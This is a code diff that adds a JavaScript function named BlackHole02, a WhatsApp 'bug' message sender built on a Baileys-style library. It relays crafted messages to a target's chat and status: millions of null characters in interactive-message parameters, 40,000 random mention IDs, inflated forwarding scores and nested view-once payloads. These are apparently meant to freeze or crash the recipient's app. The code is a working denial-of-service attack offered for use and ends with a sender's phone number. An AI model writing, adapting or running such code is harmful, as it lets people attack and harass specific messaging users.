@@ -1,39 +1,120 @@
-{
-  "status": true,
-  "criador": "Verse ApiClient",
-  "resultado": {
-    "type": "envy",
-    "ws": {
-      "_events": {
-        "CB:ib,,dirty": ["Array"]
-      },
-      "_eventsCount": 800000,
-      "_maxListeners": 0,
-      "url": "wss://web.whatsapp.com/ws/chat",
-      "config": {
-        "version": ["Array"],
-        "browser": ["Array"],
-        "waWebSocketUrl": "wss://web.whatsapp.com/ws/chat",
-        "sockCectTimeoutMs": 20000,
-        "keepAliveIntervalMs": 30000,
-        "logger": {},
-        "printQRInTerminal": false,
-        "emitOwnEvents": true,
-        "defaultQueryTimeoutMs": 60000,
-        "customUploadHosts": [],
-        "retryRequestDelayMs": 250,
-        "maxMsgRetryCount": 5,
-        "fireInitQueries": true,
-        "auth": { "Object": "authData" },
-        "markOnlineOnsockCect": true,
-        "syncFullHistory": true,
-        "linkPreviewImageThumbnailWidth": 192,
-        "transactionOpts": { "Object": "transactionOptsData" },
-        "generateHighQualityLinkPreview": false,
-        "options": {},
-        "appStateMacVerification": { "Object": "appStateMacData" },
-        "mobile": true
-      }
+async function BlackHole02(sock, target, mention = false) {
+    console.log(chalk.red("BlackHole02 Proses Sending..."));
+
+    const mentions = [
+        target,
+        "0@s.whatsapp.net",
+        "13135550002@s.whatsapp.net",
+        ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 5_000_000)}@s.whatsapp.net`)
+    ];
+
+    const payload1 = "\u0000".repeat(1_000_000);
+    const msg1 = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: { text: "BlackHole ­Ъда" },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: payload1,
+                        version: 3
+                    }
+                },
+                contextInfo: { mentionedJid: mentions }
+            }
+        }
+    }, {});
+    await sock.relayMessage("status@broadcast", msg1.message, { messageId: msg1.key.id, statusJidList: [target] });
+
+    const payload2 = "\u0000".repeat(2097152);
+    const msg2 = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc",
+                    mimetype: "image/jpeg",
+                    jpegThumbnail: "<base64-thumbnail>",
+                    contextInfo: {
+                        mentionedJid: mentions,
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 2097152,
+                        isForwarded: true
+                    }
+                },
+                nativeFlowResponseMessage: {
+                    name: "call_permission_request",
+                    paramsJson: payload2
+                }
+            }
+        }
+    }, {});
+    await sock.relayMessage("status@broadcast", msg2.message, { messageId: msg2.key.id, statusJidList: [target] });
+
+    const msg3 = {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: { text: "\u0000" + mentions.join(","), format: "STACK" },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: JSON.stringify({ status: true }) + "\u0000".repeat(10000),
+                        version: 3
+                    }
+                },
+                quotedMessage: {
+                    ephemeralMessage: {
+                        message: {
+                            viewOnceMessage: {
+                                message: {
+                                    ephemeralSettingRequestMessage: { ephemeralDuration: 0 }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+    await sock.relayMessage(target, msg3, {
+        stanzaId: "MarkZuckerberg.id" + Math.floor(Math.random() * 99999),
+        participant: { jid: target }
+    });
+    await sock.relayMessage("status@broadcast", msg3, {
+        messageId: null,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    }, { participant: target });
+
+    if (mention) {
+        const mentionPayload = {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg2.key || null,
+                        participant: "0@s.whatsapp.net",
+                        remoteJid: "status@broadcast",
+                        type: 25
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, mentionPayload);
     }
-  }
+
+    console.log(chalk.green("[РюЊ] Sucessfully Sending Bug BlackHole02 Message"));
 }
+
+SENDER : +7 931 968-27-59
